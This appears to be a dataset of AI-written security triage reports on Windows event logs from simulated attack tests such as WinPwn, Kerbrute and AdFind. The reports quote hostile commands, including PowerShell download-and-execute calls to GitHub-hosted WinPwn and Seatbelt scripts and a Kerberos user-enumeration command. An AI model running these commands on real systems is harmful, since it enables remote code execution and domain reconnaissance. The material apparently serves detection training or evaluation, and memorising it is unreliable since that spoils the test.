- **Wevtutil and Conhost Executions**: Multiple executions of `wevtutil.exe` and `conhost.exe` are observed by the `admin_test` user. This could represent regular activity if this user is under administrative privileges performing system diagnostics or configurations. No apparent misuse or exploitation is evident from the log.
- **Cmd, Reg, and Whoami Executions**: 
  - The execution of `cmd.exe` runs a command to query system BIOS and Video BIOS versions. This could indicate a script or manual check of hardware information, typically not suspicious by itself unless performed unusually frequently or by an unexpected user.
  - The `whoami.exe` usage displays logged user information, which is benign if used by administrative users for troubleshooting.
- **Microsoft Edge Update Activity**: Numerous entries related to ""Microsoft Edge Update"" processes, involving various sub-processes typical of a software update process running under the SYSTEM account. The hash values provided match the expected SHA256 for the Edge Update binaries. This activity aligns with regular application maintenance.

### System Log:
- **Kernel-General and Time-Service Events**: Time adjustment and time service events are logged, which align with the slight time change events observed in the Security log. These originate from synchronization with the external time source `time.windows.com` and reflect regular system maintenance behavior.

### Assessment:
Based on the outlined observations:
- The logs do not exhibit evidence of intentional malicious activity. Most logs reflect either scheduled or routine operations, administrative level diagnostics, or application maintenance processes.
- There is no evidence of privilege escalation, unlawful access, or execution of unauthorized applications.

### Resolution:
**BENIGN**: The Windows event logs provided contain benign activity consistent with routine maintenance and administrative tasks. No indicators of compromise or explicit malicious actions were identified in the reviewed entries.

### Recommendation:
- No immediate action is required based on the logs reviewed.
- It is recommended to continue monitoring similar activities to ensure they align with expected behaviors and user rights, especially those involving administrative tools and commands.
- Maintain regular audits of user activities, focusing on administrative accounts like `admin_test`, to ensure security policies are upheld."
Packet Capture Windows Command Prompt,"Upon reviewing the provided Windows event logs, I note the following points that warrant further investigation:

1. **Frequent Invocation of Critical System Utilities:**
   - **Processes like `powershell.exe`, `wevtutil.exe`, and `conhost.exe` are being executed frequently.** These commands can be leveraged for administrative tasks or potentially malicious activities like log clearing or evasion.
   - **`wevtutil.exe` observed multiple times:** This utility is involved in managing the Windows Event Log and could be used here potentially to clear logs, which is a common tactic for hiding malicious activity.

2. **PowerShell Script Downloading and Executing Files:**
   - There is an invocation of **PowerShell** that downloads an installer from a remote URL and executes it silently: 
     - Command observed: `""powershell.exe"" & {New-Item ... Invoke-WebRequest ... Start-Process ...}`  
     - The use of PowerShell to download and execute files, especially with parameters that suppress prompts (`/S` for silent), could indicate malicious intent, particularly if this action was not sanctioned by IT policies.

3. **Installation of Wireshark and VC Redistributables:**
   - **Wireshark Installation:** 
     - Wireshark is a legitimate network protocol analyzer, yet its installation and usage without administrative oversight could indicate suspicious activity, especially if utilized to capture network traffic.
   - **Microsoft Visual C++ Redistributable:**
     - While these are standard installations often accompanying legitimate software, their presence following a remote download and execution using PowerShell as evidenced here raises questions about their legitimacy and necessity.

4. **Execution of Network Analysis Tool (`tshark.exe`):**
   - There's an event where `cmd.exe` launches a command that involves running `tshark.exe`, command-line driven version of Wireshark: 
     - Command observed: `""cmd.exe"" /c ""c:\\Program Files\\Wireshark\\tshark.exe"" -i Ethernet -c 5`
   - The context of capturing packets (`-c 5` is to capture 5 packets) suggests an intention to observe network activity, which in cases without permission or rostered task can be dubious.

**Assessment:**

The activities captured in these logs present a mixture of legitimate and potentially dubious actions. The frequent usage of PowerShell to download and execute files, combined with installing network analysis tools, seems to contravene standard operational tasks for most server environments unless explicitly prescribed.

- **Potential Threats/Risks:**
  - Unauthorized software installations and use of network analysis tools could be aimed at internal reconnaissance or exfiltration of sensitive information.
  - Remote execution via PowerShell with downloading capabilities poses a high risk for remote code execution vulnerabilities.

- **Guidance on How to Proceed:**
  1. **Verify and Confirm:** 
     - Check with IT policies or task allocations to ascertain if such installations and executions were scheduled or approved.
  2. **Audit User Actions:** 
     - Review user activities and gather information about the user `admin_test` to determine if the account was compromised or used irresponsibly.
  3. **Network Traffic Analysis:**
     - Conduct a network forensic analysis to see if any unusual traffic patterns emerge that correlate with these activities.
  4. **Consider Isolation:**
     - Consider isolating the affected system to prevent potential spread if compromised.
  5. **Review and Secure PowerShell Usage:**
     - Implement monitoring and restriction policies around PowerShell usage in the environment.

**Resolution: SUSPICIOUS**

Given the outlined suspicious activities, further investigation is required to conclusively determine malicious intent or benignity. The context and legitimacy of software installations should be validated with corresponding administrative controls."
WinPwn - PowerSharpPack - Seatbelt,"Upon reviewing the provided logs, there are several key points of interest that indicate suspicious or potentially malicious behavior. Here is a detailed breakdown:

### Suspicious Activity:

1. **PowerShell Activity:**
   - The Windows PowerShell logs indicate the execution of a script using `iex(new-object net.webclient).downloadstring`, which is a classic indicator of potential malicious activity. This technique is often employed to download and execute code from a remote server without writing to disk, thus bypassing traditional antivirus. 
   - The execution of the `Invoke-Seatbelt.ps1` script from an external source (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1`) is particularly concerning as ""Seatbelt"" is a known reconnaissance tool used by attackers to gather information about the target system.

2. **Process Execution:**
   - Frequent use of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` may indicate scripting or administrative activity that merits further investigation. While these are legitimate Windows utilities, they are also commonly used in post-exploitation actions such as event log clearing or process manipulation.
   - The execution of `whoami.exe` and `hostname.exe` could be related to enumeration activities, usually a part of information gathering post-compromise.

3. **Network Time Protocol (NTP) Adjustment:**
   - The log records show multiple Windows Time Service (W32Time) synchronization events. Frequent or abnormal time adjustments can sometimes be related to attempts to manipulate timestamps in logs (often part of anti-forensic tactics).

4. **EdgeUpdate Executions:**
   - Repeated executions of EdgeUpdate processes—though they appear to be legitimate update processes—occur in a relatively short period. An in-depth inspection into these processes' context, especially in a production environment, might be prudent to confirm they are expected.

### Assessment:

Given the above observations, there is significant evidence to suggest potentially malicious behavior, particularly around the PowerShell activity that involves downloading and executing scripts from the web. This type of activity is characteristic of attempts to compromise system integrity and execute unauthorized code.

### Resolution: MALICIOUS

Given the use of known attack vectors (PowerShell `iex` command), the execution of system enumeration scripts (`Invoke-Seatbelt.ps1`), and the context provided by various system and application logs, it's reasonable to determine that these logs contain indicators of a potential compromise.

### Guidance on Proceeding:

1. **Immediate Containment:**
   - Disconnect the affected host (Server002) from the network to prevent further spread or communication with potential command-and-control servers.
   
2. **In-depth Analysis:**
   - Launch a full forensic investigation on Server002 to examine changes made to the system, data exfiltration attempts, and additional persistence mechanisms.
   - Verify and archive all logs related to the incident for further analysis and as evidence for post-incident review.

3. **Remediation:**
   - Review and restrict PowerShell execution policies. Ensure logging is enabled for all PowerShell activities.
   - Conduct a security assessment of administrator accounts and their recent activities.
   - Patch all systems to the latest security updates and review system configurations for potential vulnerabilities exploited.

4. **Monitoring and Detection:**
   - Implement advanced threat detection mechanisms, such as anomaly detection and enhanced logging, to better identify and respond to similar activities in the future.

5. **Incident Report:**
   - Prepare a detailed incident report and conduct a lessons-learned session with the relevant teams to prevent similar breaches in the future. 

The identified malicious activity requires urgent attention to mitigate any potential breach impacts."
DNS Server Discovery Using nslookup,"After reviewing the provided event logs, the following observations can be made:

1. **Windows Update Activity**:
   - The System logs show normal Windows Update activity related to Microsoft Defender Antivirus updates. This is routine behavior for a Windows system to keep antivirus definitions updated, and the updates have been successfully completed.

2. **Sysmon Logs Review**:
   - Execution of `whoami.exe` and `hostname.exe` was observed. These are benign Windows tools often used for checking logged-in user and hostname information. These can potentially be used by attackers for reconnaissance, but their use alone is not inherently malicious.
   - Multiple instances of `conhost.exe` and `wevtutil.exe` are found, which are typical in a system running Command Prompt or logging operations. The context and absence of unusual command-line arguments reduce suspicion.
   - Command-line usage `cmd.exe /c nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%%USERDNSDOMAIN%%` was observed. This command looks up DNS SRV records and is often used in network diagnostics or reconnaissance. While it can be used for legitimate purposes, its presence without context is somewhat anomalous and warrants further investigation, especially if this operation is unusual in the environment.
   - Normal operation of `wuauclt.exe`, `AM_Delta.exe`, `MpSigStub.exe`, and other system components like `MusNotification.exe` related to system notifications and updates were captured. These are typical Windows update-related activities.

3. **Privilege and User Context**:
   - Much of the activity is performed under high integrity level or under `NT AUTHORITY\SYSTEM`. While this itself can be standard in certain internal operations, it means the activities were performed with elevated privileges or by the system itself.

**Assessment**:

- **BENIGN**: Most of the observed activities are typical of regular system maintenance, updates, and benign user operations (e.g., `whoami`, running `hostname`). The logs primary reflect healthy update processes and expected system behaviors.
- **SUSPICIOUS**: The use of `cmd.exe` for executing an `nslookup` command for LDAP service records could indicate network reconnaissance. This behavior could justify deeper investigation to ensure it aligns with regular administrative tasks or legitimate troubleshooting efforts.

**Resolution**:
- **SUSPICIOUS**: Due to the presence of `cmd.exe` initiating a DNS query, there is a potential for reconnaissance activity. It is advisable to:
  - Verify the necessity and legitimacy of the `nslookup` operation within the organization’s network context.
  - Correlate with other logs and investigate the `admin_test` user account for any unusual patterns or activities around the same timestamp.
  - Conduct network monitoring for additional potentially unauthorized scans or queries.

Careful monitoring and further assessment could ensure these activities align with expected operations, or if they might indicate an abuse of admin privileges."
Examine local password policy - Windows,"Based on the analysis of the provided Windows event logs, here's a detailed assessment:

### Key Observations:

1. **EdgeUpdate and MicrosoftEdgeUpdate.exe Activity**:
   - Multiple instances and activities related to `MicrosoftEdgeUpdate.exe` are seen, ranging from starting services (`/svc`), registration (`/regserver`), updates, and component installations like `MicrosoftEdgeUpdateSetup`.
   - Logs also show activities for `MicrosoftEdgeUpdateComRegisterShell64.exe`, indicating routine update processes.

2. **Use of wevtutil and conhost**:
   - There are several process creation events involving `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test`. The presence of `wevtutil` could be benign if used for legitimate log management purposes or potentially suspicious for altering, clearing, or manipulating logs.

3. **High-Integrity Level Activities**:
   - Several processes in these logs were executed at a high integrity level, which might indicate administrative-level operations or automated update processes by the system.

4. **Command Prompt Operations**:
   - The usage of `cmd.exe` for `net accounts` suggests commands related to user accounts or system settings, which can be part of administrative tasks or routine system checks, potentially suspicious if not initiated by an expected process/user.

5. **Use of SYSTEM User**:
   - Many processes were initiated under the `NT AUTHORITY\SYSTEM` user, which is typical for system-level operations and services. However, any suspicious behavior should be monitored carefully, as SYSTEM level access can lead to high-privilege actions.

### Conclusion:
1. **Benign Edge Update Operations**:
   - The activities associated with `MicrosoftEdgeUpdate.exe` are consistent with normal update processes, including starting services, updating, registering components, and using typical command-line arguments.
   - These processes, given the context, appear legitimate and align with expected update behavior for Microsoft Edge.

2. **Potentially Suspicious Use of System Utilities**:
   - The repeated execution of `wevtutil.exe` could raise flags due to its potential use in tampering with logs. In a benign setup, this utility may be used for log analysis or management by a legitimate admin.
   - The execution of `cmd.exe /c net accounts` reflects a query or configuration of user accounts, which could be normal administrative tasks, but nevertheless warrants validation.

### Resolution: **SUSPICIOUS**

While the Microsoft Edge update activities appear legitimate, the utilization of tools like `wevtutil.exe` and commands executed in `cmd.exe` require further investigation to rule out any unauthorized or malicious intent. I recommend:

- Reviewing the user `SERVER002\admin_test` activities and their legitimacy.
- Checking for any unauthorized changes to system settings or log files.
- Verifying intended administrative activities and scheduled tasks.
- Enhancing monitoring for similar behavior to ensure no escalation to malicious compromise.

Further analysis or correlation with other indicators, external threat intelligence, or behavioral baselining would help in eliminating or confirming potential threats."
WinPwn - GPOAudit,"Upon reviewing the provided logs, the following observations indicate potentially malicious activity:

### Detailed Analysis:

**1. PowerShell Logs:**
- There are several PowerShell commands executed with the target of downloading and executing a script from an external source, `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn`. The usage of `iex(new-object net.webclient).downloadstring` is a known pattern for downloading and executing scripts remotely. This is immediately suspicious as it involves running scripts from an untrusted source over the internet, which is often associated with malicious activity.

**2. Sysmon Logs:**
- Process creation events show the execution of `powershell.exe` with the same external download and execution string, which further corroborates the suspicious activity found in the PowerShell logs. 
- Multiple instances of `wevtutil.exe` and `conhost.exe` are seen running, but without specific context or unusual behaviors beyond what was expected.

**3. Application, Security, and System Logs:**
- The logs in these sections appear generally normal and not distinctly indicative of malicious behavior. However, their presence does not negate the clear threat identified in the PowerShell and Sysmon logs.

### Assessment:
The combination of downloading and executing remote scripts via PowerShell, as observed in both the PowerShell and Sysmon logs, is a strong indicator of malicious activity. The script source (`WinPwn.ps1`) suggests the possibility of penetration testing tools or exploit kits, which could be used for malicious intent.

### Guideline:

- **Resolution**: MALICIOUS
    - The activities observed strongly indicate malicious behavior. Immediate containment and remediation actions are recommended.
    - Consider isolating ""Server002"" to prevent potential further compromise or lateral movement in the network.
    - Investigate `admin_test` account usage to understand if this is a compromised admin account or unauthorized access instance.
    - Perform a thorough scan for additional malicious scripts or software that may have been downloaded or executed as a result.
    - Assess network logs for any external communication to potentially malicious IP addresses related to the detected URLs.
    - Ensure incident response protocols are engaged to mitigate any further risk or impact to the organization.

Moving forward, internal awareness and training on PowerShell abuse and monitoring for unusual scripts or command executions should be emphasized, alongside a review and adjustment of security controls for detecting similar threats in the future."
WinPwn - DotNet,"Upon analyzing the provided Windows event logs, I have identified several points of interest that suggest potential malicious activity, warranting further investigation.

### Analysis:

#### 1. PowerShell Activity:
- **Indicators of Malicious Activity:** 
  - The PowerShell logs reveal the execution of PowerShell commands that involve downloading and executing scripts from a GitHub repository under the username ""S3cur3Th1sSh1t"".
  - `HostApplication=powershell.exe & { $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/.../WinPwn.ps1'); dotnet -consoleoutput -noninteractive}`: This command suggests the download and execution of a script from an external source, which is a common technique used in attacks such as file-less malware attacks where malicious scripts are directly executed in memory.
  
#### 2. Security Log:
- **Time Manipulation:**
  - Security event ID 4616 indicates that the system time was changed (PreviousTime: 2024-11-02 11:18:37 -> NewTime: 2024-11-02 11:18:24). Such manipulation of system time could potentially be used to obscure other malicious activities.

#### 3. Privilege Escalation:
- Security event ID 4672 shows that the user 'admin_test' was granted a series of high-level privileges (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege). While not inherently malicious, if unintended, such activity could elevate risks if this account were compromised.

#### 4. Sysmon Activity:
- Instances of the `conhost.exe` and `whoami.exe` processes being executed, while not inherently suspicious, should be considered in context with the PowerShell activity. 
- There are logs indicating the execution of `wevtutil.exe`, which can be used to clear or export event logs, potentially as a post-exploitation step to cover tracks.

### Key Observations:
- The most significant indicator of potential compromise is the PowerShell script execution directly from a remote URL, which strongly suggests an attempt at executing unauthorized code or scripts on this host.
- The time changes and high privilege enablement suggest anomalies that require further context and assurance of legitimate need.

### Resolution:
Based on the above analysis, the resolution for this investigation is:

**MALICIOUS** 

### Recommendations:
- **Immediate Steps:**
  1. Isolate the affected system (Server002) from the network to prevent further spread or external contact with potential command and control servers.
  2. Conduct a memory dump and disk imaging for deeper forensic analysis.
  3. Review firewall and proxy logs to confirm whether the identified URLs and others were accessed and to ascertain potential data exfiltration.
  
- **Long-term Steps:**
  1. Implement strict PowerShell execution policies and consider logging all script block invocations.
  2. Regularly audit user privileges against the principle of least privilege.
  3. Ensure consistent monitoring and alerting on unusual time changes and privilege escalation events.

These actions will help contain any malicious activity and provide insight into whether the compromise had a broader impact. Further analysis of the downloaded script and its behavior must be conducted to understand its full intent and capabilities."
Process Discovery - get-wmiObject,"After a detailed review of the provided log entries, I have compiled my analysis, focusing on potential anomalies and indicators of compromise. Here's a breakdown of my findings:

### Analysis of Logs:

#### System Logs
- The system log primarily contains entries related to time changes and adjustments. A possible indicator of concern is the change of system time, which can sometimes indicate tampering to evade detection. However, these logs appear to be routine entries related to time synchronization due to time drift, common in server environments.

#### Sysmon Logs
- The execution of various Windows utilities, like `wevtutil.exe`, `conhost.exe`, `svchost.exe`, and `PowerShell.exe` is logged. The usage of `PowerShell`, especially with the command `get-wmiObject -class Win32_Process`, might be considered suspicious in some cases as it can be used to gather system information.
- The extensive creation of `conhost.exe` instances alongside the execution of `PowerShell` and querying system processes could indicate a script or automated process running, possibly set by an admin.
- The execution of `whoami`, `hostname`, and other network/service related utilities indicates probing or validation activities, which could be normal behavior.

#### PowerShell Logs
- The logs show a PowerShell session where `get-wmiObject -class Win32_Process` is executed. This indicates gathering information about running processes, which could be perceived as reconnaissance if performed by an unauthorized user.

#### Security Logs
- There are entries indicating logon and privilege events for the user `admin_test`. The presence of high privileges (e.g., `SeDebugPrivilege`) might be normal for an admin account but should be verified.
- The logon events (ID 4624) indicate successful logins using the NTLM authentication package types. The external IP `fe80::866a:d1f8:8d06:7bc` implies connectivity over IPv6, which should be checked but does not inherently indicate malicious activity.
- The logon events and associated use of high privileges may need further verification to ensure these activities were intended and authorized.

### Conclusion
- **Resolution: SUSPICIOUS** - The log entries indicate activities that, while potentially normal in an administrative context, could also chart a pattern of unwanted scrutiny or reconnaissance if executed by unauthorized entities. The frequent and consecutive usage of system tools, coupled with PowerShell script invocations to extract process information, raises a modest eyebrow warranting further investigation.
  
### Recommended Actions
1. **Verify User Activity**: Ensure that `admin_test` actions align with legitimate administrative duties by interviewing or validating this user's intention on these dates.
2. **Inspect Command Origin**: Identify if the PowerShell scripts were executed manually or by an automated task such as a cron job or scheduled task.
3. **Review Network Access**: Assess the source IPv6 address to ensure it is expected within your environment.
4. **Enhance Monitoring**: Increase the auditing level temporarily to monitor for subsequent similar activities on this host.

Conducting these additional inquiries should foster confidence that either these actions are benign or illuminate potential security concerns that need deeper attention."
System Network Connections Discovery,"Based on the analysis of the provided logs, here are the findings:

### Suspicious or Anomalous Behavior:

1. **Command Execution:** 
   - Various command-line tools such as `whoami.exe`, `cmd.exe`, `netstat.exe`, `net.exe`, and `whoami.exe` are executed using a high integrity level by the user `SERVER002\\admin_test`. Executions of `whoami.exe` and `hostname.exe` alone may not be suspicious, but using `cmd.exe` to run commands like `netstat`, `net use`, and `net sessions` can indicate reconnaissance or lateral movement attempts.
   
2. **Use of `wevtutil.exe`:**
   - Several instances of `wevtutil.exe` are launched. This tool is often used to query or clear event logs. Its use might propose an attempt to cover tracks by clearing logs or checking log entries.

3. **Privilege Escalation:**
   - The security logs indicate that the account `admin_test` has been granted several high-level privileges (SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.), indicative of potential privilege escalation. While this might be standard for admin accounts, it coincides with the suspicious behavior mentioned.
   
4. **Logon Events:**
   - Multiple logon events with NTLM authentication confirm potential remote access or execution. The IP addresses used seem consistent with local network traffic, yet not directly indicating a compromise by itself but adds context to other actions.

5. **EdgeUpdate Execution:**
   - An execution of Microsoft Edge Update processes is observed. Although not immediately suspicious, this can be considered as normal patching/updating activity.


### Assessment:

The current activities logged seem to reflect a mix of potentially malicious behavior and regular administrative tasks. The execution of command-line utilities, along with the use of `wevtutil.exe`, and the assignment of sensitive privileges collectively suggest that an investigation should certainly be conducted to determine if these commands and processes were consistent with authorized administrative actions. 

### Resolution: SUSPICIOUS

Given the combination of privilege escalation, use of reconnaissance commands, and the execution of tools that can alter logging, the activities should be categorized as SUSPICIOUS. It merits further investigation to verify whether the activities were legitimate administrative tasks or an indicator of compromise.

### Guidance:

1. **Verification of Actions:** 
   - Confirm if the usage of command-line tools and their command executions were approved activities for the `admin_test` user. Speak with system administrators to verify these activities as legitimate.

2. **Review Privileges:**
   - Review and audit the assigned privileges for the `admin_test` account and ensure they align with job requirements. Investigate when and why they were elevated.

3. **Check for Patterns:**
   - Analyze network logs and previous activities of `admin_test` and associated IP addresses to identify patterns of behavioral anomalies, unauthorized external connections, or data transfers.

4. **Increase Monitoring:** 
   - Increase monitoring on `SERVER002` and the account `admin_test` for continued suspicious activities and implement alerting for further activity with tools like `wevtutil.exe` and command-line executions."
WinPwn - General privesc checks,"Upon review of the provided logs, the following observations can be made:

1. **Windows PowerShell Log**:
   - Several logs indicate the execution of a PowerShell script that downloads and executes a file from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This URL and script (`WinPwn.ps1`) are associated with a known penetration testing tool, which can be utilized for adversarial purposes if not authorized.
   - The use of `iex(new-object net.webclient).downloadstring(...)` is often indicative of script-based attacks due to its capability to download and execute code from the internet. This behavior is suspicious and carries the risk of executing malicious code.

2. **Application Log**:
   - No anomalies here. The logs regarding Windows Defender state it is operational, and there are some normal logging events pertaining to Edge updates and software protection.

3. **Sysmon Log**:
   - The logs show several legitimate system processes (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) being executed by the user `SERVER002\admin_test`. However, their execution is normal and associated with system operations.
   - The PowerShell execution is clearly logged with the specific command line arguments showing that it was used to download and execute the `WinPwn.ps1` script, which raises red flags due to its nature mentioned earlier.

4. **Security and System Logs**:
   - There are time adjustments shown in the Security and System logs. While these can be operational, they may also be indicative of tampering if the timestamps overlap with suspicious activities or if conducted excessively.
   - However, no direct evidence from these logs pointing to malicious activities was detected beyond time synchronization events, which can be normal in server environments.

**Assessment and Resolution**:
- The execution of a script linked with penetration testing without explicit authorization is considered highly suspicious. This, coupled with the PowerShell execution pattern, suggests at least improper or unauthorized usage of the server resources.
- The PowerShell command line invoking a script from an external site without due diligence or known purpose is a significant security concern.

**Resolution**: **SUSPICIOUS**

**Recommendations**:
- **Immediate Review**: Verify the necessity and authorization for the use of the `WinPwn.ps1` script on `Server002`. This may require speaking with the server's administrators or users.
- **Containment**: If not authorized, stop any processes associated with `WinPwn.ps1` and block external access to the listed GitHub URLs from the network firewall or proxy.
- **System Audit**: Conduct a full system audit of Server002, including a comprehensive malware scan and an integrity check on critical files and services.
- **User and Access Policy Review**: Review user permissions and PowerShell execution policies to ensure compliance with security best practices.
- **Incident Handling Procedure**: Document this behavior as a security incident and follow the company's incident response plan to address potential threats."
Adfind - Enumerate Active Directory User Objects,"Based on my analysis of the provided Windows event logs, I have observed the following:

1. **Processes and Their Execution:**
   - There is a log entry indicating that `powershell.exe` was executed by the user `SERVER002\\admin_test`. PowerShell is often leveraged in attacks due to its powerful scripting capabilities.
   - The frequent execution of `wevtutil.exe`, a utility used to manage event logs, could indicate an attempt to clear or tamper with event logs, especially since it's executed multiple times by a user with `admin_test` credentials.
   - The log shows multiple instances of `cmd.exe` and usage of `AdFind.exe`, which is a commonly used tool for reconnaissance in active directory environments. The command line `cmd.exe /c ...AdFind.exe -f (objectcategory=person)` suggests it might be used for querying domain user objects. This action is usually related to information gathering phase in an attack scenario.

2. **Unusual Software Installations and Updates:**
   - Numerous entries are related to Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`). Although regular updates are common, the significant number of executions and entries in a short timeframe, along with the presence of updates in temporary directories, raises suspicion. This could be a cover for other scripting or executables being run.

3. **Privilege Escalation Indicators:**
   - The security logs contain event ID 4672 that shows special privileges were assigned to `NT AUTHORITY\SYSTEM`. This is expected behavior, but it becomes suspicious in the context of other anomalous activities.

4. **Overall System and Security State:**
   - The presence of Windows Defender being active is noted, but no explicit logs show Defender activity beyond that status state.
   - No apparent brute force or direct exploitation attempts are recorded in the logs provided.

**Assessment:**
Given the use of `AdFind.exe` for potential reconnaissance, regular execution of PowerShell and cmd.exe under privileged accounts, especially under the context of `admin_test` using wevtutil, and the unusual frequency of Microsoft Edge update processes potentially masking malicious activities, the detected activities align with tactics commonly used in early stages of cyber-attacks or lateral movement within a network.

**Resolution: SUSPICIOUS**
The logs show activities that warrant further investigation, particularly focusing on:
- Confirming the user's intentions around `AdFind.exe` usage.
- Reviewing associated PowerShell scripts or commands executed, especially those tied to `admin_test`.
- Checking any anomalies in Microsoft Edge update processes to rule out process injection or as a decoy for other actions.
- Verifying the change made by wevtutil are legitimate and no tampering of logs has occurred.

**Guidance on Proceeding:**
- Conduct a thorough review of the PowerShell execution policy and script logs.
- Investigate the admin_test account activities and whether this is a known and authorized administrative account.
- Analyze network logs for suspicious outbound connections that might indicate data exfiltration.
- Review Microsoft Edge update mechanisms to ensure they haven’t been tampered with.
- Implement additional monitoring to alert on future similar activities with high privilege accounts."
Wevtutil - Discover NTLM Users Remote,"### Detailed Analysis and Findings

#### Suspicious or Anomalous Behavior:

1. **PowerShell Invocation:**
   - Several PowerShell events logged with an unusual script execution.
   - The PowerShell script is attempting to execute commands using `wmic.exe` to call `wevtutil` to export Security event logs that specifically relate to EventID 4776 (NTLM authentication logons). 
   - The command uses `GetHostAddresses` to resolve IP addresses for the `LOGONSERVER`.

2. **WMIC Usage:**
   - Detected multiple instances of `wmic.exe` being used to create processes via remote nodes which is atypical for regular administrative tasks.
   - The command lines indicate that an attacker may be trying to remotely extract sensitive security information from event logs.

3. **Sysmon Logs:**
   - The execution of `whoami` and `hostname` commands indicates reconnaissance activity, often used to gather information about the environment.
   - Processes like `wevtutil.exe` and `WMIC.exe` executing consecutively suggest attempts to manipulate or access logs.

4. **Edge Update Processes:**
   - Normal Edge update processes are seen which would generally be benign; however, they coincide with suspicious PowerShell and WMIC usage.

5. **Time Discrepancy and Adjustment:**
   - System time was adjusted backward, which could indicate an attempt to manipulate time-stamps in the event logs to hide malicious activity.

#### Indicators of Malicious Activity:

- The PowerShell command that attempts to access and export Security logs in conjunction with the execution of WMIC processes strongly suggest potential malicious intent.
- The pattern of the operations is indicative of a security breach or an ongoing attack focused on credential harvesting, particularly targeting NTLM authentication events.

### Assessment and Conclusion

Based on the detailed analysis of the Windows event logs provided, there is strong evidence suggesting potential malicious activity targeting the security logs for credential access. The combination of scripting through PowerShell, network interactions, remote process creation, and manipulation of time settings aligns with tactics used by attackers to exfiltrate sensitive information.

### Resolution

**Resolution: MALICIOUS** - The logs clearly exhibit indications of diverse and coherent malicious activity within the system, specifically targeting credential access and manipulation of event logs metrics.

### Recommendations and Next Steps

1. **Immediate Isolation:**
   - Isolate the affected host `Server002` from the network to prevent further data exfiltration or network spread.

2. **Endpoint Investigation:**
   - Conduct a thorough forensic analysis on `Server002` to determine the scope of intrusion, including memory dump and full disk analysis if possible.

3. **Review and Revocation:**
   - Review account and domain credentials that may have been compromised and reset passwords/implement Multi-Factor Authentication (MFA) where possible.

4. **Log Monitoring and Alerts:**
   - Enhance logging and monitoring for early detection of similar activities in future and set up alerts for excessive PowerShell and WMIC usage.

5. **Patch and Security Controls:**
   - Ensure all systems are up to date with the latest security patches.
   - Implement stricter controls on who can run PowerShell scripts across the network. 

6. **Incident Report:**
   - Document the incident and report to the necessary IT and security teams for further action and compliance.

This assessment aligns with the current understanding of intrusion techniques as of 2023, and immediate actions should be prioritized to address the identified malicious activities."
List Mozilla Firefox bookmarks on Windows with command prompt,"**Detailed Analysis:**

Upon reviewing the provided Windows event logs across multiple logs including PowerShell, Application, Security, Sysmon, and System logs, I focused on identifying any unusual activities that might indicate malicious behavior.

### 1. **PowerShell Log:**
- The PowerShell log is missing. Typically, if there were any activities executed via PowerShell, especially involving encoded or suspicious scripts, they would appear here and could be indicators of malicious activity. The absence reduces the focus on concerns related to PowerShell misuse.

### 2. **Application Log:**
- Activities are predominantly linked to services such as `Microsoft-Windows-Security-SPP` and `edgeupdate`, indicating service operations like stopping and starting, which appear consistent with routine operations such as updates or software protection actions.

### 3. **Security Log:**
- Multiple logon events with Event ID 4624 (Successful Logon) and Event ID 4672 (Special privileges assigned to new logon) are observed. These are normal administrative logon activities, primarily involving the SYSTEM user, which is often involved in routine scheduled tasks or service activities.
- Event ID 4798 (Enumeration of Local User Accounts) involving `taskhostw.exe` is observed frequently. While this could be part of routine system maintenance or updates accessing account details, it does warrant a closer look if it happens excessively without a routine basis.

### 4. **Sysmon Log:**
- The logs reveal multiple processes related to system management and updates, such as `MicrosoftEdgeUpdate`, `svchost.exe`, `wsqmcons.exe`, `rundll32.exe`, etc. These processes executing with system-level integrity are generally part of routine operating system services and updates.
- Execution of several commands like `cmd.exe`, `where.exe`, and `whoami.exe` with high integrity level could indicate malicious intention, especially when observed together or if these come from unexpected users or paths.
- String references to `Edge Update` and its related actions seem voluminous, suggesting system updates, which align with the logged update activities in other logs.

### 5. **System Log:**
- A routine time synchronization event is noted, aligning with typical operations for maintaining system time accuracy using Windows time services.

### **Assessment and Conclusion:**

Given the information reviewed:
- **Benign Indicators:** The actions and process executions appear consistent with normal system operations, such as updates and routine security checks.
- **Suspicious Indicators:** Although some processes like `taskhostw.exe` are involved in account enumeration, such activities are not uncommon during system diagnostics, maintenance, or updates.
- **Malicious Indicators:** No explicit evidence of processes typically used in attacks, such as anomalous binaries or clear privilege escalations, were observed.

**Resolution: SUSPICIOUS**

Though the activities can be attributed to legitimate operations, such as updates and system maintenance, the frequency of account enumerations and the presence of cmd-line utilities used in potentially questionable contexts recommend a cautious approach. Further investigation, such as cross-checking user activity, confirmation of update schedules, and verifying the integrity and source of update binaries, is advised to confirm the benign nature of these activities."
Kerbrute - userenum,"Upon careful analysis of the provided event logs, I have identified potential indicators of suspicious activity with a focus on the utilization of PowerShell, which may suggest potentially unauthorized or malicious behavior. Here are the key findings:

### Suspicious or Anomalous Behavior:
1. **Frequent PowerShell Execution**:
   - Multiple instances of PowerShell execution are recorded in the logs. Notably, PowerShell is executed with command lines that include the use of `kerbrute.exe`, suggesting attempts to enumerate users possibly for reconnaissance purposes.
   - Example from the logs:
     - Log entry shows the command: `powershell.exe & {cd \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\"", .\\kerbrute.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\username.txt\""}`
     - This behavior aligns with common tactics employed in credential enumeration and privilege escalation attacks.

2. **Tool Usage**:
   - Usage of `kerbrute.exe` is typically not associated with legitimate administrative tasks and is often used by attackers for Kerberos brute force attacks to enumerate Active Directory accounts.

3. **Execution from Non-Standard Directories**:
   - PowerShell and potentially unwanted applications like `kerbrute.exe` are executed from temporary directories, which is often a tactic used by adversaries to avoid detection.

